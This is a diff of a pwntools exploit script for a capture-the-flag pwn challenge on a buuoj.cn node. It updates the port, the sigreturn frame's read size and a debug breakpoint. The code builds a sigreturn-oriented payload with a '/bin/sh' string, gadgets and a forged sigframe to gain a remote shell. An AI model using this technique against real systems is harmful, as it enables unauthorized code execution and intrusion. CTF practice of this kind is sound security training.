@@ -11,7 +11,7 @@ from pwn import *
 
 
 local = 0
-url, port = "node5.buuoj.cn", "26216" 
+url, port = "node5.buuoj.cn", "25314" 
 filename = "./pwn_1"
 elf = ELF(filename)
 context(arch="amd64", os="linux")
@@ -45,7 +45,7 @@ def pwn():
     sigframe.rdi = constants.SYS_read
     sigframe.rsi = 0
     sigframe.rdx = bss_addr
-    sigframe.rcx = 0x100
+    sigframe.rcx = 0x400 # not enough for 0x100
     sigframe.rsp = bss_addr + len(padding_str)
     sigframe.rip = syscall_addr
 
@@ -66,7 +66,7 @@ def pwn():
     payload = b'/bin/sh\x00'.ljust(len(padding_str), b'\x00')
     payload += p64(pop_rdi_addr) + p64(15) + p64(syscall_addr)
     payload += bytes(sigframe)
-    B()
+    # B()
     io.sendline(payload)
 
 
